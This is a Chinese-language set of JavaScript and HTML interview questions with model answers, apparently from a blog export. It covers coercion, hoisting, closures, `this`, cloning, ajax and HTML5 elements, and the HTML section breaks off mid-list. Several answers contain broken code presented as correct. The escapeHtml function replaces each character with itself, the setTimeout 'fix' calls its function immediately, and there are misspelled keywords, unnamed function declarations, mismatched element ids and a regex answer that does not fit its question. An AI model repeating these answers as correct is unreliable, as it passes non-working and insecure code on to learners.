解释：null是一个只有一个值的数据类型，这个值就是null。表示一个空指针对象，所以用typeof检测会返回”object”。 ==10. 看下列代码,输出什么？解释原因。==123456789var undefined;undefined == null; // true1 == true; // true2 == true; // false0 == false; // true0 == &apos;&apos;; // trueNaN == NaN; // false[] == false; // true[] == ![]; // true undefined与null相等，但不恒等（===） 一个是number一个是string时，会尝试将string转换为number 尝试将boolean转换为number，0或1 尝试将Object转换成number或string，取决于另外一个对比量的类型 所以，对于0、空字符串的判断，建议使用 “===” 。“===”会先判断两边的值类型，类型不匹配时为false。 那么问题来了，看下面的代码，输出什么，foo的类型为什么？ 123var foo = &quot;11&quot;+2-&quot;1&quot;;console.log(foo);console.log(typeof foo); 执行完后foo的值为111，foo的类型为Number。 123var foo = &quot;11&quot;+2+&quot;1&quot;; //体会加一个字符串&apos;1&apos; 和 减去一个字符串&apos;1&apos;的不同console.log(foo);console.log(typeof foo); 执行完后foo的值为1121(此处是字符串拼接)，foo的类型为String。 ==11. 看代码给答案。==12345var a = new Object();a.value = 1;b = a;b.value = 2;alert(a.value); 答案：2（考察引用数据类型细节） ==12. 已知数组var stringArray = [“This”, “is”, “Baidu”, “Campus”]，Alert出”This is Baidu Campus”==。答案：alert(stringArray.join(“ “)) 那么问题来了，已知有字符串foo=”get-element-by-id”,写一个function将其转化成驼峰表示法”getElementById”。 123456789function combo(msg)&#123; var arr = msg.split(&quot;-&quot;); var len = arr.length; //将arr.length存储在一个局部变量可以提高for循环效率 for(var i=1;i&lt;len;i++)&#123; arr[i]=arr[i].charAt(0).toUpperCase()+arr[i].substr(1,arr[i].length-1); &#125; msg=arr.join(&quot;&quot;); return msg;&#125; ==13. var numberArray = [3,6,2,4,1,5]; （考察基础API）==1) 实现对该数组的倒排，输出[5,1,4,2,6,3] 2) 实现对该数组的降序排列，输出[6,5,4,3,2,1] 12345var numberArray = [3,6,2,4,1,5];numberArray.reverse(); // 5,1,4,2,6,3numberArray.sort(function(a,b)&#123; //6,5,4,3,2,1 return b-a;&#125;) ==14. 输出今天的日期，以YYYY-MM-DD的方式，比如今天是2014年9月26日，则输出2014-09-26==1234567891011var d = new Date();// 获取年，getFullYear()返回4位的数字var year = d.getFullYear();// 获取月，月份比较特殊，0是1月，11是12月var month = d.getMonth() + 1;// 变成两位month = month &lt; 10 ? &apos;0&apos; + month : month;// 获取日var day = d.getDate();day = day &lt; 10 ? &apos;0&apos; + day : day;alert(year + &apos;-&apos; + month + &apos;-&apos; + day); ==15. 将字符串”{id}{id}{name}”中的{id}替换成10，{id}替换成10，{name}替换成Tony （使用正则表达式）==答案：1&quot;&lt;tr&gt;&lt;td&gt;&#123;id&#125;&lt;/td&gt;&lt;td&gt;&#123;id&#125;&lt;/td&gt;&lt;td&gt;&#123;id&#125;_&#123;$name&#125;&lt;/td&gt;&lt;/tr&gt;&quot;.replace(/&#123;\$id&#125;/g, &apos;10&apos;).replace(/&#123;\$name&#125;/g, ‘Tony’); ==16. 为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数escapeHtml，将&lt;, &gt;, &amp;, “进行转义==1234567891011121314function escapeHtml(str) &#123;return str.replace(/[&lt;&gt;”&amp;]/g, function(match) &#123; switch (match) &#123; case “&lt;”: return “&lt;”; case “&gt;”: return “&gt;”; case “&amp;”: return “&amp;”; case “\””: return “&quot;”; &#125;&#125;);&#125; ==17. foo = foo||bar ，这行代码是什么意思？为什么要这样写？==答案：if(!foo) foo = bar; //如果foo存在，值不变，否则把bar的值赋给foo。 短路表达式：作为”&amp;&amp;”和”||”操作符的操作数表达式，这些表达式在进行求值时，只要最终的结果已经可以确定是真或假，求值过程便告终止，这称之为短路求值。 ==18. 看下列代码，将会输出什么?==123456var foo = 1;function()&#123; console.log(foo); var foo = 2; console.log(foo);&#125; 答案：输出undefined 和 2。上面代码相当于： 1234567var foo = 1;function()&#123; var foo; console.log(foo); //undefined foo = 2; console.log(foo); // 2; &#125; 函数声明与变量声明会被JavaScript引擎隐式地提升到当前作用域的顶部，但是只提升名称不会提升赋值部分。 ==19. 用js实现随机选取10–100之间的10个数字，存入一个数组，并排序。==123456789var iArray = [];funtion getRandom(istart, iend)&#123; var iChoice = iend - istart +1; return Math.floor(Math.random() * iChoice + istart);&#125;for(var i=0; i&lt;10; i++)&#123; iArray.push(getRandom(10,100));&#125;iArray.sort(); ==20. 把两个数组合并，并删除第二个元素。==1234var array1 = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;];var bArray = [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;];var cArray = array1.concat(bArray);cArray.splice(1,1); ==21. 怎样添加、移除、移动、复制、创建和查找节点（原生JS，实在基础，没细写每一步）== 创建新节点 createDocumentFragment() //创建一个DOM片段 createElement() //创建一个具体的元素 createTextNode() //创建一个文本节点 添加、移除、替换、插入 appendChild() //添加 removeChild() //移除 replaceChild() //替换 insertBefore() //插入 查找 getElementsByTagName() //通过标签名称 getElementsByName() //通过元素的Name属性的值 getElementById() //通过元素Id，唯一性 ==22. 有这样一个URL：http://item.taobao.com/item.htm?a=1&amp;b=2&amp;c=&amp;d=xxx&amp;e，请写一段JS程序提取URL中的各个GET参数(参数名和参数个数不确定)，将其按key-value形式返回到一个json结构中，如{a:&#39;1‘, b:’2’, c:’’, d:’xxx’, e:undefined}。==答案： 123456789function serilizeUrl(url) &#123; var result = &#123;&#125;; url = url.split(&quot;?&quot;)[1]; var map = url.split(&quot;&amp;&quot;); for(var i = 0, len = map.length; i &lt; len; i++) &#123; result[map[i].split(&quot;=&quot;)[0]] = map[i].split(&quot;=&quot;)[1]; &#125; return result;&#125; ==23. 正则表达式构造函数var reg=new RegExp(“xxx”)与正则表达字面量var reg=//有什么不同？匹配邮箱的正则表达式？==答案：当使用RegExp()构造函数的时候，不仅需要转义引号（即\”表示”），并且还需要双反斜杠（即\表示一个\）。使用正则表达字面量的效率更高。 邮箱的正则匹配： 1var regMail = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((.[a-zA-Z0-9_-]&#123;2,3&#125;)&#123;1,2&#125;)$/; ==24. 看下面代码，给出输出结果。==12345for(var i=1;i&lt;=3;i++)&#123; setTimeout(function()&#123; console.log(i); &#125;,0); &#125;; 答案：4 4 4。 原因：++Javascript事件处理器在线程空闲之前不会运行++。那么问题来了，如何让上述代码输出1 2 3？ 123456789for(var i=1;i&lt;=3;i++)&#123; setTimeout((function(a)&#123; //改成立即执行函数 console.log(a); &#125;)(i),0); &#125;; 1 //输出23 ==25. 写一个function，清除字符串前后的空格。（兼容所有浏览器）==使用自带接口trim()，考虑兼容性： 123456789if (!String.prototype.trim) &#123; String.prototype.trim = function() &#123; return this.replace(/^\s+/, &quot;&quot;).replace(/\s+$/,&quot;&quot;); &#125;&#125; // test the functionvar str = &quot; \t\n test string &quot;.trim();alert(str == &quot;test string&quot;); // alerts &quot;true&quot; ==26. Javascript中callee和caller的作用？==答案： caller是返回一个对函数的引用，该函数调用了当前函数； callee是返回正在被执行的function函数，也就是所指定的function对象的正文。 那么问题来了？如果一对兔子每月生一对兔子；一对新生兔，从第二个月起就开始生兔子；假定每对兔子都是一雌一雄，试问一对兔子，第n个月能繁殖成多少对兔子？（使用callee完成） 12345678910111213141516var result=[];function fn(n)&#123; //典型的斐波那契数列 if(n==1)&#123; return 1; &#125;else if(n==2)&#123; return 1; &#125;else&#123; if(result[n])&#123; return result[n]; &#125;else&#123; //argument.callee()表示fn() result[n]=arguments.callee(n-1)+arguments.callee(n-2); return result[n]; &#125; &#125;&#125; 中级==1. 实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制== 考察点1：对于基本数据类型和引用数据类型在内存中存放的是值还是指针这一区别是否清楚 考察点2：是否知道如何判断一个变量是什么类型的 考察点3：递归算法的设计// 方法一： 12345678910111213141516171819202122232425262728293031323334// 方法一：Object.prototype.clone = function() &#123; var o = this.constructor === Array ? [] : &#123;&#125;; for (var e in this) &#123; o[e] = typeof this[e] === &quot;object&quot; ? this[e].clone() : this[e]; &#125; return o;&#125; //方法二：/** * 克隆一个对象 * @param Obj * @returns */function clone(Obj) &#123; var buf; if (Obj instanceof Array) &#123; buf = []; //创建一个空的数组 var i = Obj.length; while (i--) &#123; buf[i] = clone(Obj[i]); &#125; return buf; &#125; else if (Obj instanceof Object) &#123; buf = &#123;&#125;; //创建一个空对象 for (var k in Obj) &#123; //为这个对象添加新的属性 buf[k] = clone(Obj[k]); &#125; return buf; &#125; else &#123; //普通变量直接赋值 return Obj; &#125;&#125; ==2. 如何消除一个数组里面重复的元素？==12345678910111213141516171819var arr = [1, 2, 3, 3, 4, 4, 5, 5, 6, 1, 9, 3, 25, 4]; function deRepeat() &#123; var newArr = []; var obj = &#123;&#125;; var index = 0; var l = arr.length; for (var i = 0; i &lt; l; i++) &#123; if (obj[arr[i]] == undefined) &#123; obj[arr[i]] = 1; newArr[index++] = arr[i]; &#125; else if (obj[arr[i]] == 1) continue; &#125; return newArr; &#125;var newArr2 = deRepeat(arr);alert(newArr2); //输出1,2,3,4,5,6,9,25 ==3. 小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象：==12345678function Dog() &#123; this.wow = function() &#123; alert(’Wow’); &#125; this.yelp = function() &#123; this.wow(); &#125;&#125; ==小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）==答案： 123456789101112131415function MadDog() &#123; this.yelp = function() &#123; var self = this; setInterval(function() &#123; self.wow(); &#125;, 500); &#125;&#125;MadDog.prototype = new Dog(); //for testvar dog = new Dog();dog.yelp();var madDog = new MadDog();madDog.yelp(); ==4. 下面这个ul，如何点击每一列的时候alert其index?（闭包）==12345&lt;ul id=”test”&gt; &lt;li&gt;这是第一条&lt;/li&gt; &lt;li&gt;这是第二条&lt;/li&gt; &lt;li&gt;这是第三条&lt;/li&gt;&lt;/ul&gt; 答案： 123456789101112131415161718192021// 方法一：var lis=document.getElementById(&apos;2223&apos;).getElementsByTagName(&apos;li&apos;);for(var i=0;i&lt;3;i++)&#123; lis[i].index=i; lis[i].onclick=function()&#123; alert(this.index); &#125;;&#125; //方法二：var lis=document.getElementById(&apos;2223&apos;).getElementsByTagName(&apos;li&apos;);for(var i=0;i&lt;3;i++)&#123; lis[i].index=i; lis[i].onclick=(function(a)&#123; return function() &#123; alert(a); &#125; &#125;)(i);&#125; ==5. 编写一个JavaScript函数，输入指定类型的选择器(仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器)可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。==答案： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657var query = function(selector) &#123; var reg = /^(#)?(\.)?(\w+)$/img; var regResult = reg.exec(selector); var result = []; //如果是id选择器 if(regResult[1]) &#123; if(regResult[3]) &#123; if(typeof document.querySelector === &quot;function&quot;) &#123; result.push(document.querySelector(regResult[3])); &#125; else &#123; result.push(document.getElementById(regResult[3])); &#125; &#125; &#125; //如果是class选择器 else if(regResult[2]) &#123; if(regResult[3]) &#123; if(typeof document.getElementsByClassName === &apos;function&apos;) &#123; var doms = document.getElementsByClassName(regResult[3]); if(doms) &#123; result = converToArray(doms); &#125; &#125; //如果不支持getElementsByClassName函数 else &#123; var allDoms = document.getElementsByTagName(&quot;*&quot;) ; for(var i = 0, len = allDoms.length; i &lt; len; i++) &#123; if(allDoms[i].className.search(new RegExp(regResult[2])) &gt; -1) &#123; result.push(allDoms[i]); &#125; &#125; &#125; &#125; &#125; //如果是标签选择器 else if(regResult[3]) &#123; var doms = document.getElementsByTagName(regResult[3].toLowerCase()); if(doms) &#123; result = converToArray(doms); &#125; &#125; return result; &#125; function converToArray(nodes)&#123; var array = null; try&#123; array = Array.prototype.slice.call(nodes,0);//针对非IE浏览器 &#125;catch(ex)&#123; array = new Array(); for( var i = 0 ,len = nodes.length; i &lt; len ; i++ ) &#123; array.push(nodes[i]) &#125; &#125; return array; &#125; ==6. 请评价以下代码并给出改进意见。==123456789101112if(window.addEventListener)&#123; var addListener = function(el,type,listener,useCapture)&#123; el.addEventListener(type,listener,useCapture); &#125;;&#125;else if(document.all)&#123; addListener = function(el,type,listener)&#123; el.attachEvent(&quot;on&quot;+type,function()&#123; listener.apply(el); &#125;); &#125; &#125; 评价： 不应该在if和else语句中声明addListener函数，应该先声明； 不需要使用window.addEventListener或document.all来进行检测浏览器，应该使用能力检测； 由于attachEvent在IE中有this指向问题，所以调用它时需要处理一下 改进如下： 12345678910111213function addEvent(elem, type, handler) &#123; if (elem.addEventListener) &#123; elem.addEventListener(type, handler, false); &#125; else if (elem.attachEvent) &#123; elem[&apos;temp&apos; + type + handler] = handler; elem[type + handler] = function() &#123; elem[&apos;temp&apos; + type + handler].apply(elem); &#125;; elem.attachEvent(&apos;on&apos; + type, elem[type + handler]); &#125; else &#123; elem[&apos;on&apos; + type] = handler; &#125;&#125; ==7. 给String对象添加一个方法，传入一个string类型的参数，然后将string的每个字符间价格空格返回，例如：====addSpace(“hello world”) // -&gt; ‘h e l l o w o r l d’==123String.prototype.spacify = function() &#123; return this.split(&apos;&apos;).join(&apos; &apos;);&#125;; 接着上述答题，那么问题来了 1）直接在对象的原型上添加方法是否安全？尤其是在Object对象上。(这个我没能答出？希望知道的说一下。) 2）函数声明与函数表达式的区别？ 答案： 1） 容易造成全局污染，和其他库冲突 出了Bug不太好定位问题 有可能出现代码向上不兼容的情况，比如定义了一个Object.prototype.clone。万一ES7、ES8也定义了这个函数，那旧代码不就会出现问题了嘛！ 2）在Javscript中，解析器在向执行环境中加载数据时，对函数声明和函数表达式并非是一视同仁的，解析器会率先读取函数声明，并使其在执行任何代码之前可用（可以访问），至于函数表达式，则必须等到解析器执行到它所在的代码行，才会真正被解析执行。（函数声明提升） ==8. 定义一个log方法，让它可以代理console.log的方法。==可行的方法一： 1234function log(msg) &#123; console.log(msg);&#125;log(&quot;hello world!&quot;) // hello world! 如果要传入多个参数呢？显然上面的方法不能满足要求，所以更好的方法是： 123function log() &#123; console.log.apply(console, arguments);&#125;; 那么问题来了，apply和call方法的异同？ 答案： 对于apply和call两者在作用上是相同的，即是调用一个对象的一个方法，以另一个对象替换当前对象。将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。 但两者在参数上有区别的。对于第一个参数意义都一样，但对第二个参数： apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，而call则作为call的参数传入（从第二个参数开始）。 如 func.call(func1,var1,var2,var3)对应的apply写法为：func.apply(func1,[var1,var2,var3]) 。 ==9. 在Javascript中什么是伪数组？如何将伪数组转化为标准数组？==答案： 伪数组（类数组）：无法直接调用数组方法或期望length属性有什么特殊的行为，但仍可以对真正数组遍历方法来遍历它们。典型的是函数的argument参数，还有像调用getElementsByTagName,document.childNodes之类的,它们都返回NodeList对象都属于伪数组。可以使用Array.prototype.slice.call(fakeArray)将数组转化为真正的Array对象。 假设接第八题题干，我们要给每个log方法添加一个”(app)”前缀，比如’hello world!’ -&gt;’(app)hello world!’。方法如下： 123456function log() &#123; var args = Array.prototype.slice.call(arguments); //为了使用unshift数组方法，将argument转化为真正的数组 args.unshift(&apos;(app)&apos;); console.log.apply(console, args);&#125;; ==10. 对作用域上下文和this的理解，看下列代码：==12345678910var User = &#123; count: 1, getCount: function() &#123; return this.count; &#125;&#125;;console.log(User.getCount()); // what?var func = User.getCount;console.log(func()); // what? 问两处 console 输出什么？为什么？ 答案是 1 和 undefined。 func 是在 winodw 的上下文中被执行的，所以会访问不到 count 属性。 那么问题来了，如何确保Uesr总是能访问到func的上下文，即正确返回1。 答案：正确的方法是使用Function.prototype.bind。兼容各个浏览器完整代码如下: 12345678910Function.prototype.bind = Function.prototype.bind || function(context) &#123; var self = this; return function() &#123; return self.apply(context, arguments); &#125;;&#125; var func = User.getCount.bind(User);console.log(func()); ==11. 原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？如何用原生JS实现Jq的ready方法？==window.onload()方法是必须等到页面内包括图片的所有元素加载完毕后才能执行。 $(document).ready()是DOM结构绘制完毕后就执行，不必等到加载完毕。 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* * 传递函数给whenReady() * 当文档解析完毕且为操作准备就绪时，函数作为document的方法调用 */var whenReady = (function() &#123; //这个函数返回whenReady()函数 var funcs = []; //当获得事件时，要运行的函数 var ready = false; //当触发事件处理程序时,切换为true //当文档就绪时,调用事件处理程序 function handler(e) &#123; if (ready) return; //确保事件处理程序只完整运行一次 //如果发生onreadystatechange事件，但其状态不是complete的话,那么文档尚未准备好 if (e.type === &apos;onreadystatechange&apos; &amp;&amp; document.readyState !== &apos;complete&apos;) &#123; return; &#125; //运行所有注册函数 //注意每次都要计算funcs.length //以防这些函数的调用可能会导致注册更多的函数 for (var i = 0; i &lt; funcs.length; i++) &#123; funcs[i].call(document); &#125; //事件处理函数完整执行,切换ready状态, 并移除所有函数 ready = true; funcs = null; &#125; //为接收到的任何事件注册处理程序 if (document.addEventListener) &#123; document.addEventListener(&apos;DOMContentLoaded&apos;, handler, false); document.addEventListener(&apos;readystatechange&apos;, handler, false); //IE9+ window.addEventListener(&apos;load&apos;, handler, false); &#125; else if (document.attachEvent) &#123; document.attachEvent(&apos;onreadystatechange&apos;, handler); window.attachEvent(&apos;onload&apos;, handler); &#125; //返回whenReady()函数 return function whenReady(fn) &#123; if (ready) &#123; fn.call(document); &#125; else &#123; funcs.push(fn); &#125; &#125;&#125;)(); 如果上述代码十分难懂，下面这个简化版： 12345678910111213141516function ready(fn)&#123; if(document.addEventListener) &#123; //标准浏览器 document.addEventListener(&apos;DOMContentLoaded&apos;, function() &#123; //注销事件, 避免反复触发 document.removeEventListener(&apos;DOMContentLoaded&apos;,arguments.callee, false); fn(); //执行函数 &#125;, false); &#125;else if(document.attachEvent) &#123; //IE document.attachEvent(&apos;onreadystatechange&apos;, function() &#123; if(document.readyState == &apos;complete&apos;) &#123; document.detachEvent(&apos;onreadystatechange&apos;, arguments.callee); fn(); //函数执行 &#125; &#125;); &#125;&#125;; ==12.（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）==回答出概念即可，下面是几个要点 给需要拖拽的节点绑定mousedown, mousemove, mouseup事件 mousedown事件触发后，开始拖拽 mousemove时，需要通过event.clientX和clientY获取拖拽位置，并实时更新位置 mouseup时，拖拽结束 需要注意浏览器边界的情况 说出以下函数的作用是？空白区域应该填写什么？ 1234567891011121314151617181920//define(function(window) &#123; function fn(str) &#123; this.str = str; &#125; fn.prototype.format = function() &#123; var arg = ______; return this.str.replace(_____, function(a, b) &#123; return arg[b] || &quot;&quot;; &#125;); &#125; window.fn = fn;&#125;)(window); //use(function() &#123; var t = new fn(&apos;&lt;p&gt;&lt;a href=&quot;&#123;0&#125;&quot;&gt;&#123;1&#125;&lt;/a&gt;&lt;span&gt;&#123;2&#125;&lt;/span&gt;&lt;/p&gt;&apos;); console.log(t.format(&apos;http://www.alibaba.com&apos;, &apos;Alibaba&apos;, &apos;Welcome&apos;));&#125;)(); 答案：访函数的作用是使用format函数将函数的参数替换掉{0}这样的内容，返回一个格式化后的结果： 第一个空是：arguments第二个空是：/{(\d+)}/ig ==14. 用面向对象的Javascript来介绍一下自己。（没答案哦亲，自己试试吧）==答案： 对象或者Json都是不错的选择哦。 ==15. 讲解原生Js实现ajax的原理。==Ajax 的全称是Asynchronous JavaScript and XML，其中，Asynchronous 是异步的意思，它有别于传统web开发中采用的同步的方式。 Ajax的原理简单来说通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。 XMLHttpRequest是ajax的核心机制，它是在IE5中首先引入的，是一种支持异步请求的技术。简单的说，也就是javascript可以及时向服务器提出请求和处理响应，而不阻塞用户。达到无刷新的效果。 XMLHttpRequest这个对象的属性有： onreadystatechang 每次状态改变所触发事件的事件处理程序。 responseText 从服务器进程返回数据的字符串形式。 responseXML 从服务器进程返回的DOM兼容的文档数据对象。 status 从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪） status Text 伴随状态码的字符串信息 readyState 对象状态值 0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法） 1 (初始化) 对象已建立，尚未调用send方 2 (发送数据) send方法已调用，但是当前的状态及http头未知 3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误， 4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据 下面简单封装一个函数：（略长，点击打开） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758ajax(&#123; url: &quot;./TestXHR.aspx&quot;, //请求地址 type: &quot;POST&quot;, //请求方式 data: &#123; name: &quot;super&quot;, age: 20 &#125;, //请求参数 dataType: &quot;json&quot;, success: function (response, xml) &#123; // 此处放成功后执行的代码 &#125;, fail: function (status) &#123; // 此处放失败后执行的代码 &#125; &#125;); function ajax(options) &#123; options = options || &#123;&#125;; options.type = (options.type || &quot;GET&quot;).toUpperCase(); options.dataType = options.dataType || &quot;json&quot;; var params = formatParams(options.data); //创建 - 非IE6 - 第一步 if (window.XMLHttpRequest) &#123; var xhr = new XMLHttpRequest(); &#125; else &#123; //IE6及其以下版本浏览器 var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;); &#125; //接收 - 第三步 xhr.onreadystatechange = function () &#123; if (xhr.readyState == 4) &#123; var status = xhr.status; if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123; options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML); &#125; else &#123; options.fail &amp;&amp; options.fail(status); &#125; &#125; &#125; //连接 和 发送 - 第二步 if (options.type == &quot;GET&quot;) &#123; xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true); xhr.send(null); &#125; else if (options.type == &quot;POST&quot;) &#123; xhr.open(&quot;POST&quot;, options.url, true); //设置表单提交时的内容类型 xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); xhr.send(params); &#125; &#125; //格式化参数 function formatParams(data) &#123; var arr = []; for (var name in data) &#123; arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name])); &#125; arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;)); return arr.join(&quot;&amp;&quot;); &#125; 上述代码大致表述了ajax的过程，释义自行google，问题未完，那么知道什么是Jsonp和pjax吗？ 答案： Jsonp：(JSON with Padding)是一种跨域请求方式。主要原理是利用了script 标签可以跨域请求的特点，由其 src 属性发送请求到服务器，服务器返回 js 代码，网页端接受响应，然后就直接执行了，这和通过 script 标签引用外部文件的原理是一样的。JSONP由两部分组成：回调函数和数据，回调函数一般是由网页端控制，作为参数发往服务器端，服务器端把该函数和数据拼成字符串返回。 pjax：pjax是一种基于ajax+history.pushState的新技术，该技术可以无刷新改变页面的内容，并且可以改变页面的URL。（关键点：可以实现ajax无法实现的后退功能）pjax是ajax+pushState的封装，同时支持本地存储、动画等多种功能。目前支持jquery、qwrap、kissy等多种版本。 ==16. call、apply、bind三者异同== apply 、 call 、bind 三者都是用来改变函数的this对象的指向的； apply 、 call 、bind 三者第一个参数都是this要指向的对象，也就是想指定的上下文； apply 、 call 、bind 三者都可以利用后续参数传参； bind是返回对应函数，便于稍后调用；apply、call则是立即调用 。 ==17. Javascript的this用法==this是Javascript语言的一个关键字。 它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用。 随着函数使用场合的不同，this的值会发生变化。但是有一个总的原则，那就是this指的是，调用函数的那个对象。下面分四种情况，详细讨论this的用法。 情况一：纯粹的函数调用 这是函数的最通常用法，属于全局性调用，因此this就代表全局对象Global。 123456var x = 1; function test()&#123; this.x = 0; &#125; test(); alert(x); //0 情况二：作为对象方法的调用 函数还可以作为某个对象的方法调用，这时this就指这个上级对象 1234567function test()&#123; alert(this.x); &#125; var o = &#123;&#125;; o.x = 1; o.m = test; o.m(); // 1 情况三 作为构造函数调用 所谓构造函数，就是通过这个函数生成一个新对象（object）。这时，this就指这个新对象。 123456var x = 2; function test()&#123; this.x = 1; &#125; var o = new test(); alert(x); //2 运行结果为2，表明全局变量x的值根本没变。 情况四 call apply调用 apply()是函数对象的一个方法，它的作用是改变函数的调用对象，它的第一个参数就表示改变后的调用这个函数的对象。因此，this指的就是这第一个参数。 12345678var x = 0; function test()&#123; alert(this.x); &#125; var o=&#123;&#125;; o.x = 1; o.m = test; o.m.apply(); //0 ==18.哪些常见操作会造成内存泄漏？==内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）]]></content>
      <categories>
        <category>Js</category>
      </categories>
      <tags>
        <tag>Js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html简述]]></title>
    <url>%2F2018%2F05%2F06%2FHTML%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[==1. HTML的Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?==&lt;!DOCTYPE&gt; 声明位于文档中的最前面的位置，处于 标签之前。此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。所谓的标准模式是指，浏览器按 W3C 标准解析执行代码；怪异模式则是使用浏览器自己的方式解析执行代码，因为不同浏览器解析执行的方式不一样，所以我们称之为怪异模式。浏览器解析时到底使用标准模式还是怪异模式，与你网页中的 DTD 声明直接相关， DTD 声明定义了标准文档的类型（标准模式解析）文档类型，会使浏览器使用相应的方式加载网页并显示，忽略 DTD 声明 , 将使网页进入怪异模式。 ==2. 简述document.write和 innerHTML的区别。==document.write只能重绘整个页面, innerHTML可以重绘页面的一部分。 ==3. 浏览器页面有哪三层构成，分别是什么，作用是什么？==构成：结构层、表示层、行为层分别是：HTML、CSS、JavaScript作用：HTML实现页面结构，CSS完成页面的表现与风格，JavaScript实现一些客户端的功能与业务。 ==4. HTML5有哪些新特性、移除了哪些元素？==Html5新增了 27 个元素，废弃了 16 个元素，根据现有的标准规范，把HTML5的元素按优先级定义为结构性属性、级块性元素、行内语义性元素和交互性元素 4 大类。结构性元素主要负责web上下文结构的定义 section：在 web 页面应用中，该元素也可以用于区域的章节描述。 header：页面主体上的头部， header 元素往往在一对 body 元素中。 footer：页面的底部（页脚），通常会标出网站的相关信息。 nav：专门用于菜单导航、链接导航的元素，是 navigator 的缩写。 article：用于表现一篇文章的主体内容，一般为文字集中显示的区域。 级块性元素主要完成web页面区域的划分，确保内容的有效分割。 aside：用于表达注记、贴士、侧栏、摘要、插入的引用等作为补充主体的内容。 figure：是对多个元素进行组合并展示的元素，通常与 ficaption 联合使用。 code：表示一段代码块。 dialog：用于表达人与人之间的对话，该元素包含 dt 和 dd 这两个组合元素， dt 用于表示说话者，而 dd 用来表示说话内容。 行内语义性元素主要完成web页面具体内容的引用和描述，是丰富内容展示的基础。 meter：表示特定范围内的数值，可用于工资、数量、百分比等。 time：表示时间值。 progress：用来表示进度条，可通过对其 max 、 min 、 step 等属性进行控制，完成对进度的表示和监事。 video：视频元素，用于支持和实现视频文件的直接播放，支持缓冲预载和多种视频媒体格式。 audio：音频元素，用于支持和实现音频文件的直接播放，支持缓冲预载和多种音频媒体格式。 交互性元素主要用于功能性的内容表达，会有一定的内容和数据的关联，是各种事件的基础。 details：用来表示一段具体的内容，但是内容默认可能不显示，通过某种手段（如单击）与 legend 交互才会显示出来。 datagrid：用来控制客户端数据与显示，可以由动态脚本及时更新。 menu：主要用于交互菜单（曾被废弃又被重新启用的元素）。 command：用来处理命令按钮。==5. 你做的网页在哪些流览器测试过,这些浏览器的内核分别是什么?== IE : trident 内核 Firefox ： gecko 内核 Safari : webkit 内核 Opera : 以前是 presto 内核， Opera 现已改用 Google Chrome 的 Blink 内核 Chrome : Blink( 基于 webkit ， Google 与 Opera Software 共同开发 ) ==6. 对WEB标准以及W3C的理解与认识?==标签闭合、标签小写、不乱嵌套、提高搜索机器人搜索几率、使用外链css和 js 脚本、结构行为表现的分离、文件下载与页面速度更快、内容能被更多的用户所访问、内容能被更广泛的设备所访问、更少的代码和组件，容易维护、改版方便，不需要变动页面内容、提供打印版本而不需要复制内容、提高网站易用性。 ==7. HTML5行内元素有哪些,块级元素有哪些, 空元素有哪些?==(1)行内元素 a - 锚点 abbr - 缩写 acronym - 首字 b - 粗体 ( 不推荐 ) bdo - bidi override big - 大字体 br - 换行 cite - 引用 code - 计算机代码 ( 在引用源码的时候需要 ) dfn - 定义字段 em - 强调 font - 字体设定 ( 不推荐 ) i - 斜体 img - 图片 input - 输入框 kbd - 定义键盘文本 label - 表格标签 q - 短引用 s - 中划线 ( 不推荐 ) samp - 定义范例计算机代码 select - 项目选择 small - 小字体文本 span - 常用内联容器，定义文本内区块 strike - 中划线 strong - 粗体强调 sub - 下标 sup - 上标 textarea - 多行文本输入框 tt - 电传文本 u - 下划线 var - 定义变量 (2)块元素 (block element) address - 地址 blockquote - 块引用 center - 举中对齐块 dir - 目录列表 div - 常用块级容易，也是 css layout 的主要标签 dl - 定义列表 fieldset - form控制组 form - 交互表单 h3 - 大标题 h4 - 副标题 h3 - 3级标题 h4 - 4级标题 h5 - 5级标题 h6 - 6级标题 hr - 水平分隔线 isindex - input prompt menu - 菜单列表 noframes - frames可选内容，（对于不支持 frame 的浏览器显示此区块内容 noscript - 